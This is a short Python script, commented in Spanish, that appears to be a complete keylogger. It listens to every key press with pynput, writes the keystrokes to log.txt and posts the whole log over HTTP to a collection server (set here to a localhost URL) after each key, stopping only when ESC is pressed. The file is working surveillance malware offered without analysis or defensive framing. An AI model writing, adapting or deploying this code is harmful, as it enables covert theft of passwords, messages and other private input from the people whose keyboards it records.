import requests
from pynput.keyboard import Key, Listener

# Guardamos la ruta, donde vamos a enviar la infomacion
server_url = "http://localhost:8080/log"

keys = []


def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)

# Creamos el txt donde se guarda la infomacion por tecla
def convertir_string(keys):
    with open("log.txt", "w+") as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)

        logfile.seek(0)
        contents = logfile.read()
        enviar_datos(contents)

# Vamos a enviar los datos
def enviar_datos(datos):
    try:
        response = requests.post(server_url, data=datos)
        if response.status_code == 200:
            print("Datos enviados correctamente")
        else:
            print(
                f"Error al enviar datos al servidor{response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"No se pudo conectar con el servidor: {e}")

# Al precionar la Tecla "ESC" termina el proceso
def soltar_tecla(key):
    if key == Key.esc:
        return False

# Se queda en modo eschuca al precionar cada tecla
with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()